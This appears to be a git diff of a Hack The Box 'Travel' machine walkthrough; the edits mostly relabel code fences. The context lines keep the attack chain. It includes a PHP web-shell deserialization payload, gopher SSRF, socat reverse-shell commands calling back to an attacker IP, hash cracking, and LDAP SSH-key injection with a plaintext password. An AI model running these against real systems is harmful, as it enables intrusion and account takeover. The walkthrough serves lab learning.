@@ -72,7 +72,7 @@ So let's move on to it.
 
 `/` is forbidden. Let's run some enum:
 
-```shell-session
+```shell
 ╭─zoey@virtual-parrot ~/sec/htb ‹master›
 ╰─$ gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://blog-dev.travel.htb
 ===============================================================
@@ -93,7 +93,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 
 Looks like there's a git repository. Let's see what we can grab with the dumper from https://github.com/internetwache/GitTools:
 
-```shell-session
+```shell
 ╭─zoey@virtual-parrot ~/sec/htb/travel ‹master›
 ╰─$ ../tools/GitTools/Dumper/gitdumper.sh http://blog-dev.travel.htb/.git/ blog-dev-git
 ###########
@@ -135,7 +135,7 @@ Looks like there's a git repository. Let's see what we can grab with the dumper 
 
 Let's take a look in our new folder and see what we dumped.
 
-```shell-session
+```shell
 ╭─zoey@virtual-parrot ~/sec/htb/travel/blog-dev-git ‹master›
 ╰─$ ls -la
 total 12
@@ -146,7 +146,7 @@ drwxr-xr-x 6 zoey zoey 4096 May 26 12:31 .git
 
 Hmmm, not much. Let's take a look at the log:
 
-```shell-session
+```shell
 ╭─zoey@virtual-parrot ~/sec/htb/travel/blog-dev-git ‹master›
 ╰─$ git log --stat
 commit 0313850ae948d71767aff2cc8cc0f87a0feeef63 (HEAD -> master)
@@ -163,7 +163,7 @@ Date:   Tue Apr 21 01:34:54 2020 -0700
 
 So we should have three files. They weren't pulled though, so we'll need to recreate them from the history. We can do this by restoring the 'deleted' files:
 
-```shell-session
+```shell
 ╭─zoey@virtual-parrot ~/sec/htb/travel/blog-dev-git ‹master›
 ╰─$ git status
 On branch master
@@ -472,12 +472,11 @@ execute? Looking up memcache documentation and setting up my own instance I find
 
 `set xct_debe7386b5352dfae5de0601d7c1f670 4 0 128 O:14:"TemplateHelper":2:{s:20:".TemplateHelper.file";s:5:"s.php";s:20:".TemplateHelper.data";s:26:"<?php system($_GET[1]); ?>";}`
 
-After some googling we find that we can utilize the `gopher://`(https://hackerone.com/reports/115748) protocol to send newlines with an underscore after the host:port,
-and %0a for new lines. Testing this against a local memcached server though, resulted in an error: `CLIENT_ERROR bad data chunk`. After a little more searching
-we find a tool https://github.com/tarunkant/Gopherus. Using gopherus for our payload is a bit tricky given that we can't copy/paste in the null bytes properly(which
-I learned the hard way), and it seems to calculate the length improperly if we pass the urlencoded payload. Also, `+`'s in the url don't seem to work.
-I had to learn all this through trial and error and replicating the box setup on my own machine(an exercise left to the reader). Let's modify our php script to
-generate a payload:
+After some googling we find that we can utilize the `gopher://`(https://hackerone.com/reports/115748) protocol to send newlines with an underscore after 
+the host:port, and %0a for new lines.  After a little more searching we find a tool https://github.com/tarunkant/Gopherus. Using gopherus for our payload 
+is a bit tricky given that we can't copy/paste in the null bytes properly(which I learned the hard way), and it seems to calculate the length improperly 
+if we pass the urlencoded payload. Also, `+`'s in the url don't seem to work. I had to learn all this through trial and error and replicating the box 
+setup on my own machine(an exercise left to the reader). Let's modify our php script to generate a payload:
 
 ```php
 <?php
@@ -528,7 +527,7 @@ Let's make a call to the php script we just made for the payload and then use it
 resolves to the box's address. I used a different payload the first time trying this as socat is not usually available, but it is, so lets use it
 on our scripted way back into the box.
 
-```sh
+```bash
 #!/bin/sh
 
 GREEN="\e[0;32m"
@@ -560,7 +559,7 @@ socat file:`tty`,raw,echo=0 tcp-listen:22473
 
 And let's give it a try:
 
-```shell-session
+```shell
 ╭─zoey@parrot-virtual ~/sec/htb/travel ‹master› 
 ╰─$ ./reverse-shell.sh
 htb ip 10.10.14.12
@@ -582,7 +581,7 @@ from your local server: `curl http://10.10.14.39/tools/bash.php -o ../bash.php`.
 
 Then we can setup a reverse shell. On kali:
 
-```shell-session
+```shell
 ╭─zoey@virtual-parrot ~/sec/htb/travel ‹master›
 ╰─$ socat file:`tty`,raw,echo=0 tcp-listen:22473
 www-data@blog:/var/www/html/wp-content/themes/twentytwenty$
@@ -590,7 +589,7 @@ www-data@blog:/var/www/html/wp-content/themes/twentytwenty$
 
 And on the remote machine via bash.php:
 
-```shell-session
+```shell
 www-data@blog:/var/www/html/wp-content/themes/twentytwenty# socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.39:22473
 ```
 
@@ -613,7 +612,7 @@ UNLOCK TABLES;
 /*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;
 ```
 
-```shell-session
+```shell
 ╭─zoey@virtual-parrot ~/sec/htb/travel ‹master›
 ╰─$ hashcat -a 0 -m 400 lynik-admin.hash /usr/share/wordlists/rockyou.txt
 hashcat (v5.1.0) starting...
@@ -700,7 +699,7 @@ trvl-admin:x:1000:1000:trvl-admin:/home/trvl-admin:/bin/bash
 
 Setup a socks proxy via ssh and run `nmap` against the ldap server:
 
-```shell-session
+```shell
 ╭─zoey@virtual-parrot ~
 ╰─$ ssh -D localhost:9050 -f -N lynik-admin@travel.htb
 ╭─zoey@virtual-parrot ~
@@ -752,7 +751,7 @@ In `.viminfo`:
 
 Searching...
 
-```shell-session
+```shell
 lynik-admin@travel:~$ ldapsearch -D cn=lynik-admin,dc=travel,dc=htb -w Theroadlesstraveled -x -b 'dc=travel,dc=htb'
 # extended LDIF
 #
@@ -865,7 +864,7 @@ sshPublicKey: ${ssh_public_key}" | ldapmodify -D cn=lynik-admin,dc=travel,dc=htb
 
 Searching after our changes shows:
 
-```shell-session
+```shell
 lynik-admin@travel:~/tmp$ ldapsearch -D cn=lynik-admin,dc=travel,dc=htb -w Theroadlesstraveled -x -b 'dc=travel,dc=htb' 'uid=jane'
 # extended LDIF
 #
@@ -911,7 +910,7 @@ result: 0 Success
 
 Let's try to SSH in as jane now:
 
-```shell-session
+```shell
 ╭─zoey@virtual-parrot ~/sec/htb/travel ‹master›
 ╰─$ ssh jane@travel.htb
 Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-26-generic x86_64)
@@ -973,7 +972,7 @@ sshPublicKey: ${ssh_public_key}" | ldapmodify -D cn=lynik-admin,dc=travel,dc=htb
 
 And now let's SSH in as `jane`.
 
-```shell-session
+```shell
 ╭─zoey@virtual-parrot ~
 ╰─$ ssh jane@travel.htb
 Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-26-generic x86_64)
